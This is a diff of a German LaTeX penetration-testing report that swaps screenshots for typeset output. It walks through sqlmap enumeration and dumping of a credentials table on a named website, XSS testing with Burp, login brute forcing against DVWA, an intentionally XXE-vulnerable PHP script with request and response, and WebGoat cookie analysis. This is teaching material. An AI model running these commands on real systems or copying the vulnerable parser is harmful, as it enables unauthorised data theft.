@@ -30,7 +30,7 @@ National Institute of Standards and Technology legt nahe, dass Penetrationstests
 
 Penetrationstests können auf verschiedene Arten durchgeführt werden. Der häufigste Unterschied ist das Wissen über die Implementierungsdetails der getesteten Systeme, die dem Tester zur Verfügung gestellt wurden. Die weithin akzeptierten Ansätze sind Black-Box-, White-Box- und Gray-Box-Tests.
 
-\begin{figure}
+\begin{figure}[h]
 	\centering
 	\includegraphics[width=14cm]{blackwhitegray.jpg}
 	\caption{Die akzeptierte Ansätze\cite{bwgtesting16}}
@@ -148,6 +148,8 @@ Tester Informationen über die eingesetzten Systeme und installierten Anwendunge
 testender Komponenten sollte in dieser Phase genug Zeit eingeplant werden. Beinhaltet der Test eine große
 Menge an Rechnern, kann die Informationsbeschaffung einige Wochen andauern.
 
+\newpage
+
 \subsection{Bewertung der Informationen und Risikoanalyse}
 
 \begin{figure}[h]
@@ -229,7 +231,7 @@ Der Angriff wird mit SQLMap ausgeführt. Zuerst muss den Datenbankname zum Vorsc
 
 Ziel-URL: \texttt{http://www.acfurniture.com/item.php?id=25}\\
 
-\textbf{A. Datenbankname aufdecken}
+\textbf{A. Datenbankname aufdecken}\\
 
 \begin{LaTeXCode}[caption={Aufdeckung vom Datenbankname},captionpos=b, label=LaTeXCode:advd1][numbers=none]
 ~# sqlmap -u "http://www.acfurniture.com/item.php?id=25" --dbs
@@ -237,15 +239,17 @@ Ziel-URL: \texttt{http://www.acfurniture.com/item.php?id=25}\\
 
 Mit dem oben gegebenen Befehl wurde der Datenbankname erhalten:
 
-\begin{figure}[h]
+\begin{table}[h]
 	\centering
-	\includegraphics[width=\textwidth]{ac.png}
+	\begin{tabular}{l}
+		available databases         \\
+		{[}*{]} acfurniture         \\
+		{[}*{]} information\_schema
+	\end{tabular}
 	\caption{Ergebnis: Datenbankname}
-\end{figure}
+\end{table}
 
-\newpage
-
-\textbf{B. Tabellenname aufdecken}
+\textbf{B. Tabellenname aufdecken}\\
 
 \begin{LaTeXCode}[caption={Aufdeckung vom Tabellenname},captionpos=b, label=LaTeXCode:advt1][numbers=none]
 ~# sqlmap -u "http://www.acfurniture.com/item.php?id=25" -D acfurniture --tables
@@ -253,37 +257,60 @@ Mit dem oben gegebenen Befehl wurde der Datenbankname erhalten:
 
 Das Ergebnis sollte so aussehen:
 
-\begin{figure}[h]
+\begin{table}[]
 	\centering
-	\includegraphics[width=7cm]{resulttabellenname.png}
+	\begin{tabular}{|l|}
+		\hline
+		{[}Date{]} {[}INFO{]} retrived: settings \\ \hline
+		Database: acfurniture                    \\ \hline
+		{[}4 tables{]}                           \\ \hline
+		category                                 \\ \hline
+		product                                  \\ \hline
+		product\_hacked                          \\ \hline
+		settings                                 \\ \hline
+	\end{tabular}
 	\caption{Ergebnis: Tabellenname}
-\end{figure}
+\end{table}
+
+\newpage
 
 Bisher wurde festgestellt, dass die Website \texttt{acfurniture.com} hat zwei Datenbanken, acfurniture und information\_schema. Die Datenbank \texttt{acfurniture} enthält vier Tabellen: \texttt{category}, \texttt{product}, \texttt{product\_hacked} und settings.\\
 
-\textbf{C. Spalten aufdecken}
+\textbf{C. Spalten aufdecken}\\
 
 \begin{LaTeXCode}[caption={Aufdeckung von Spalten},captionpos=b, label=LaTeXCode:advs1][numbers=none]
 ~# sqlmap -u "http://www.acfurniture.com/item.php?id=25" -D acfurniture -T settings --columns
 \end{LaTeXCode}
 
-\begin{figure}[h]
+\begin{table}[h]
 	\centering
-	\includegraphics[width=7cm]{aufdeckungvonspalten.png}
+	\begin{tabular}{|l|l|}
+		\hline
+		Database:          & acfurniture      \\ \hline
+		Table              & settings         \\ \hline
+		\multicolumn{2}{|l|}{{[}6 columns{]}} \\ \hline
+		Column             & Type             \\ \hline
+		activationcode     & varchar(2048)    \\ \hline
+		email              & varchar(45)      \\ \hline
+		id                 & int(11)          \\ \hline
+		password           & varchar(1024)    \\ \hline
+		status             & smallint(2)      \\ \hline
+		username           & varchar(45)      \\ \hline
+	\end{tabular}
 	\caption{Ergebnis: Spalten}
-\end{figure}
-
-\newpage
+\end{table}
 
 Die \texttt{settings} Tabelle besteht aus 6 Spalten, und dies ist eigentlich ein Konto mit Anmeldeinformationen. Jetzt wird versucht diese Informationen auszugeben.\\
 
-\textbf{D. Informationen aufdecken}
+\textbf{D. Informationen aufdecken}\\
 
 Man kann alle Daten in der Tabelle mit folgendem Befehl ausgeben:
 
 \begin{LaTeXCode}[caption={Aufdeckung von alle Daten in der Tabelle},captionpos=b, label=LaTeXCode:alledatenausgeben1][numbers=none]
 ~# sqlmap -u "http://www.acfurniture.com/item.php?id=25" -D acfurniture -T settings --dump
 \end{LaTeXCode}
+
+\newpage
 
 Das Ergebnis sollte so aussehen:
 
@@ -311,6 +338,8 @@ Man muss eine entsprechende Eingabe in die Webanwendung eingeben und die Anfrage
 	\caption{Erfassung der Anfrage durch Burp}
 \end{figure}
 
+\newpage
+
 Die Anfrage wird von Burp erfasst. Die HTTP-Anforderung wird auf der Intercept-Tab angezeigt. Es wird mit der rechten Maustaste auf die Anforderung geklickt, um das Kontextmenü aufzurufen und dann wird auf "`An Repeater senden"' geklickt.
 
 \begin{figure}[h]
@@ -320,6 +349,8 @@ Die Anfrage wird von Burp erfasst. Die HTTP-Anforderung wird auf der Intercept-T
 \end{figure}
 
 Hier können verschiedene XSS-Payloads in das Eingabefeld eingegeben werden. Verschiedene Eingaben getestet werden, indem der Tester das "`Value"' des entsprechenden Parameters in den Tabs "`Raw"' oder "`Params"' bearbeiten. In diesem Beispiel wird versucht, dass ein Pop-up in unserem Browser ausgeführt wird.
+
+\newpage
 
 \begin{figure}[h]
 	\centering
@@ -367,7 +398,7 @@ In einem ersten Schritt wird analysiert, wie die Anmeldeanforderung gesendet wir
 	\caption{Anfrage an den Server und Antwort von dem Server}
 \end{figure}
 
-Wir können sehen, dass sich die Anfrage in \texttt{/dvwa/login.php} befindet und drei Variablen hat: \texttt{username}, \texttt{password}, and \texttt{login}.
+Wir können sehen, dass sich die Anfrage in \texttt{/dvwa/login.php} befindet und drei Variablen hat: \texttt{username}, \texttt{password}, and \texttt{login}.\\
 
 Wenn die Erfassung von Anforderungen beendet wird und das Ergebnis im Browser überprüft wird, kann festgestellt werden, dass die Antwort eine Weiterleitung zur Anmeldeseite ist\cite[144]{najera2016kali}:
 
@@ -377,7 +408,7 @@ Wenn die Erfassung von Anforderungen beendet wird und das Ergebnis im Browser ü
 	\caption{Die Weiterleitung zur Anmeldeseite}
 \end{figure}
 
-Eine gültige Kombination aus Benutzername und Kennwort sollte nicht zu demselben Login, sondern zu einer anderen Seite, z. B. index.php, weitergeleitet werden. Wir gehen also davon aus, dass ein gültiges Login auf die andere Seite umgeleitet wird, und wir verwenden \texttt{login.php} als Zeichenfolge, um zu unterscheiden, wenn ein Versuch fehlschlägt\cite[145]{najera2016kali}.
+Eine gültige Kombination aus Benutzername und Kennwort sollte nicht zu demselben Login, sondern zu einer anderen Seite, z. B. index.php, weitergeleitet werden. Wir gehen also davon aus, dass ein gültiges Login auf die andere Seite umgeleitet wird, und wir verwenden \texttt{login.php} als Zeichenfolge, um zu unterscheiden, wenn ein Versuch fehlschlägt\cite[145]{najera2016kali}.\\
 
 Es wird den folgenden Befehl in ein Terminal eingeführt\cite[145]{najera2016kali}:
 
@@ -396,51 +427,93 @@ Mittels diesem Befehl wird nur zwei Kombinationen pro Benutzer ausprobiert: pass
 
 \subsection{Testen von XML External Entities (XXE)}
 
-Wenn eine Anwendung XML-Daten parst und das Ergebnis von geparstem XML in einer HTTP-Antwort anzeigt, würde ein grundlegender Testfall zum Testen der XXE-Sicherheitsanfälligkeit eine XXE-Payload senden, die eine interne Entität ver"`Alphabet"'wendet, nur um sicherzustellen, dass die Anwendung Entitäten enthält oder nicht. Dieses Tutorial stammt aus Infosec Institute\cite{infosec18}.
+Wenn eine Anwendung XML-Daten parst und das Ergebnis von geparstem XML in einer HTTP-Antwort anzeigt, würde ein grundlegender Testfall zum Testen der XXE-Sicherheitsanfälligkeit eine XXE-Payload senden, die eine interne Entität ver"`Alphabet"'wendet, nur um sicherzustellen, dass die Anwendung Entitäten enthält oder nicht. Dieses Tutorial stammt aus Infosec Institute\cite{infosec18}.\\
 
 Es wird den folgenden PHP-Code als xxe.php im Webserver-Stammordner gespeichert:
 
 \newpage
 
-\begin{figure}[h]
-	\centering
-	\includegraphics[width=10cm]{xxeattacke.jpg}
-	\caption{xxe.php}
-\end{figure}
+\begin{LaTeXCode}[caption={XXE PHP-Datei},captionpos=b][numbers=none]
+<?php
+libxml_disable_entity_loader (false);
+\$xmlfile = file_get_contents('php://input');
+\$dom = new DOMDocument();
+\$dom->loadXML(\$xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
+\$o = simplexml_import_dom(\$dom);
+\$user = \$o->username;
+\$pass = \$o->password;
+echo "username : \$user";\\
+\end{LaTeXCode}
 
-Eine POST-Anforderung an die xxe.php-Datei mit XML-Daten gesendet, die im folgenden Screenshot gezeigt werden:
+Eine POST-Anforderung an die \texttt{xxe.php}-Datei mit XML-Daten gesendet, die im folgenden Screenshot gezeigt werden:
 
-\begin{figure}[h]
-	\centering
-	\includegraphics[width=11cm]{xxeattacke2.jpg}
-	\caption{POST Anfrage zu xxe.php}
-\end{figure}
+\begin{LaTeXCode}[caption={POST Anfrage zu PHP-Datei},captionpos=b][numbers=none]
+POST /vulnapps/xxe.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0
+Accept: text/html, application/xhtml+xml, application/xml
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: text/xml
+Content-Length: 98
+
+	<root>
+		<username>sahil</username>
+		<password>supersecurepassword</password>
+	</root>\\
+\end{LaTeXCode}
 
 Hier soll beachtet werden, dass die Anwendung in der HTTP-Antwort einen Benutzernamen anzeigt, der bestätigt, dass die XML-Daten geparst werden.
 
-\newpage
+\begin{LaTeXCode}[caption={Geparste XML-Daten},captionpos=b][numbers=none]
+HTTP/1.1 200 OK
+Date: Tue, 15 May 2018 17:40:35 GMT
+Server: Apache/2.4.27 (Win64) PHP/5.6.31
+X-Powered-By: PHP/5.6.31
+Content-Length: 16
+Connection: close
+Content-Type: text/xml; charset-UTF-8	
 
-\begin{figure}[h]
-	\centering
-	\includegraphics[width=10cm]{xxeattacke4.png}
-	\caption{Geparste XML-Daten}
-\end{figure}
+username: sahil\\
+\end{LaTeXCode}
 
-Nun wird den XML-Daten eine interne Entität hinzugefügt und im \texttt{username} Element mit \&u verweist und die Anfrage erneut gesendet.
+Nun wird den XML-Daten eine interne Entität hinzugefügt und im \texttt{username} Element mit \&u verweist und die Anfrage erneut gesendet.\\
 
-\begin{figure}[h]
-	\centering
-	\includegraphics[width=\textwidth]{xxeattacke5.jpg}
-	\caption{Manipulierte Anfrage}
-\end{figure}
+\begin{LaTeXCode}[caption={Manipulierte Anfrage},captionpos=b][numbers=none]
+POST /vulnapps/xxe.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0
+Accept: text/html, application/xhtml+xml, application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: text/xml
+Content-Length: 98
 
-Hier soll beachtet nochmal werden, dass die Anwendung der interne Einheit auflöst und die XXE-Sicherheitsanfälligkeit erfolgreich bestätigt.
+<xml version="1.0"?>
+<!DOCTYPE foo[<!ENTITY u 'username from internal entity'>]>	
+	<root>
+		<username>\&u;</username>
+		<password>supersecurepassword</password>
+	</root>\\
+\end{LaTeXCode}
 
-\begin{figure}[h]
-	\centering
-	\includegraphics[width=10cm]{xxeattacke6.jpg}
-	\caption{Bestätigung der XXE-Schwachstelle}
-\end{figure}
+Hier soll beachtet nochmal werden, dass die Anwendung der interne Einheit auflöst und die XXE-Sicherheitsanfälligkeit erfolgreich bestätigt.\\
+
+\begin{LaTeXCode}[caption={Bestätigung der XXE-Schwachstelle},captionpos=b][numbers=none]
+	HTTP/1.1 200 OK
+	Date: Sun, 20 May 2018 06:31:39 GMT
+	Server: Apache/2.4.27 (Win64) PHP/5.6.31
+	X-Powered-By: PHP/5.6.31
+	Content-Length: 16
+	Connection: close
+	Content-Type: text/html; charset-UTF-8	
+	
+	username: username from internal entity\\
+\end{LaTeXCode}
 
 \newpage
 
@@ -448,27 +521,23 @@ Hier soll beachtet nochmal werden, dass die Anwendung der interne Einheit auflö
 Dieses Tutorial stammt aus der Webseite Tutorialspoint\cite{tpfa15}.
 Eine Webanwendung unterstützt das Umschreiben von URLs, indem Sitzungs-IDs in die URL eingefügt werden.\\
 
-\texttt{http://example.com/sale/saleitems/jsessionid=2P0OC2JSNDLPSKHCJUN2JV/}
+\texttt{http://example.com/sale/saleitems/jsessionid=2P0OC2JSNDLPSKHC}
 
-\texttt{?item=laptop}\\
+\texttt{JUN2JV/?item=laptop}\\
 
-Ein authentifizierter Benutzer der Website leitet die URL an seine Freunde weiter, um Informationen zu den reduzierten Verkäufen zu erhalten. Er sendet den obigen Link per E-Mail, ohne zu wissen, dass der Benutzer auch die Sitzungs-IDs verschenkt. Wenn seine Freunde den Link verwenden, verwenden sie seine Sitzung und seine Kreditkarte.
+Ein authentifizierter Benutzer der Website leitet die URL an seine Freunde weiter, um Informationen zu den reduzierten Verkäufen zu erhalten. Er sendet den obigen Link per E-Mail, ohne zu wissen, dass der Benutzer auch die Sitzungs-IDs verschenkt. Wenn seine Freunde den Link verwenden, verwenden sie seine Sitzung und seine Kreditkarte.\\
 
-Man muss sich bei Webgoat anmelden und zum Abschnitt \texttt{"`Session Management Flaws"'} navigiert wird.
-
-\begin{figure}[h]
-	\centering
-	\includegraphics[width=\textwidth]{fa1.jpg}
-	\caption{Anmeldung bei Webgoat}
-\end{figure}
-
-Wenn mit den Anmeldeinformationen webgoat/webgoat angemeldet wird, wird in Burp Suite festgestellt, dass die \texttt{JSESSION-ID C8F3177CCAFF380441ABF71090748F2E} lautet, während \texttt{AuthCookie = 65432ubphcfx} nach erfolgreicher Authentifizierung ist.
+Man muss sich bei Webgoat anmelden und zum Abschnitt \texttt{"`Session Management Flaws"'} navigiert wird.\\
 
 \begin{figure}[h]
 	\centering
 	\includegraphics[width=10cm]{fa2.jpg}
 	\caption{Anmeldung bei Webgoat}
 \end{figure}
+
+Wenn mit den Anmeldeinformationen webgoat/webgoat angemeldet wird, wird in Burp Suite festgestellt, dass die \texttt{JSESSION-ID C8F3177CCAFF380441ABF71090748F2E} lautet, während \texttt{AuthCookie = 65432ubphcfx} nach erfolgreicher Authentifizierung ist.
+
+\newpage
 
 \begin{figure}[h]
 	\centering
@@ -484,11 +553,11 @@ Wenn mit den Anmeldeinformationen aspect/aspect angemeldet wird, wird in Burp Su
 	\caption{Burp Suite: AuthCookie Kontrolle 2}
 \end{figure}
 
-\newpage
-
-Nun muss die AuthCookie Patterns analysiert werden. Die erste Hälfte \texttt{65432} ist für beide Authentifizierungen üblich. Daher sind wir jetzt daran interessiert, den letzten Teil der Authcookie-Werte zu analysieren, wie - \texttt{ubphcfx} für den Benutzer \texttt{webgoat} und \texttt{udfqtb} für den jeweiligen Aspektbenutzer.
+Nun muss die AuthCookie Patterns analysiert werden. Die erste Hälfte \texttt{65432} ist für beide Authentifizierungen üblich. Daher sind wir jetzt daran interessiert, den letzten Teil der Authcookie-Werte zu analysieren, wie - \texttt{ubphcfx} für den Benutzer \texttt{webgoat} und \texttt{udfqtb} für den jeweiligen Aspektbenutzer.\\
 
 Wenn die AuthCookie-Werte genauer angesehen werden, hat der letzte Teil dieselbe Länge wie der Benutzername. Es ist daher offensichtlich, dass der Benutzername bei einer Verschlüsselungsmethode verwendet wird. Bei Versuchen und Fehlern / Brute-Force-Mechanismen wird festgestellt, dass nach der Umkehrung des Benutzernamens \texttt{webgoat}; es wird jetzt rausgefunden, dass es \texttt{taogbew} ist und dann wird das Zeichen vor dem Alphabet als AuthCookie d. h. \texttt{ubphcfx} verwendet.
+
+\newpage
 
 \begin{figure}[h]
 	\centering
@@ -570,7 +639,7 @@ Wenn es fertig ist, wird auf "`Alerts"' geklickt, um Sicherheitsprobleme der Web
 \begin{figure}[h]
 	\centering
 	\includegraphics[width=12cm]{owaspzapgui4.png}
-	\caption{Spider Ergebnis}
+	\caption{Gefundene Sicherheitslücken}
 	\label{quickscan4}
 \end{figure}
 
@@ -588,11 +657,11 @@ Die Einrichtzeit bei dem manuellen Testen ist im Vergleich zum automatisierten T
 Der umfassende Test der manuellen Penetrationstests macht es zu einem sehr komplexen Prozess. Die wiederholte Aufgaben, die während des manuellen Tests ausgeführt werden, können zu ungenauen oder falschen Ergebnissen führen.  Dieser Prozess erfordert während der gesamten Testdauer ein Team von erfahrenen Testern, was es zu einer sehr teuren Option macht. Diese Tester müssen sehr erfahren sein, da sie alle Aufgaben manuell steuern müssen. Bei automatisierten Anwendungssicherheitstests wird weniger Personal benötigt, um das Scannen und die Analyse durchzuführen.
 
 %%positives - auto
-Automatisiertes Testen bietet Vorteile für größere Projekte, da die anfänglichen Kosten für die Automatisierung und die Testwartung sehr hoch sein können. Automatisierung hilft dabei, menschliche Fehler zu vermeiden - einige Fehler, die bei manuellen Tests gemacht werden, können reduziert werden. Dies betrifft Fehler, die durch die Durchführung einer langen Liste alltäglicher Aktivitäten entstanden sind. Automatisiertes Testen ist eine sichere und einfache Methode, um alle Aufgaben im Zusammenhang mit dem Durchdringungstest durchzuführen. Da die meisten Aufgaben automatisiert sind, können Tests weniger zeitaufwändig sein als manuelle Tests. Die einfache Reproduzierbarkeit der Tests ist auch ein großer Vorteil gegenüber dem individuellen Ansatz beim manuellen Testen.
+Automatisiertes Testen bietet Vorteile für größere Projekte, da die anfänglichen Kosten für die Automatisierung und die Testwartung sehr hoch sein können. Automatisierung hilft dabei, menschliche Fehler zu vermeiden - einige Fehler, die bei manuellen Tests gemacht werden, können reduziert werden. Dies betrifft Fehler, die durch die Durchführung einer langen Liste alltäglicher Aktivitäten entstanden sind. Automatisiertes Testen ist eine sichere und einfache Methode, um alle Aufgaben im Zusammenhang mit dem Durchdringungstest durchzuführen. Da die meisten Aufgaben automatisiert sind, können Tests weniger zeitaufwändig sein als manuelle Tests. Die einfache Reproduzierbarkeit der Tests ist auch ein großer Vorteil gegenüber dem individuellen Ansatz beim manuellen Testen\cite{autovorteil99}.
 
-Automatisierte Tests sind schneller als manuelle Tests. Da die Automatisierte Test schneller ist, werden die Ergebnisse auch schneller akkumuliert. Sicherheitsberichte werden automatisch generiert und können zur Offline-Prüfung als XML-, PDF- oder HTML-Dateien exportiert werden.
+Automatisierte Tests sind schneller als manuelle Tests. Da die Automatisierte Test schneller ist, werden die Ergebnisse auch schneller akkumuliert. Sicherheitsberichte werden automatisch generiert und können zur Offline-Prüfung als XML-, PDF- oder HTML-Dateien exportiert werden\cite{autovorteil99}.
 
-Automatisierung kann zu den folgenden Kostensenkungen führen. Die Kosten für: 
+Automatisierung kann zu den folgenden Kostensenkungen führen. Die Kosten für\cite{autovorteil99}: 
 
 \begin{itemize} 
 	\item die Entwicklung automatisierter Tests.
@@ -600,7 +669,6 @@ Automatisierung kann zu den folgenden Kostensenkungen führen. Die Kosten für:
 	\item die Überprüfung der Testergebnisse.
 \end{itemize} 
 
-\cite{autovorteil99}
 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
 
 
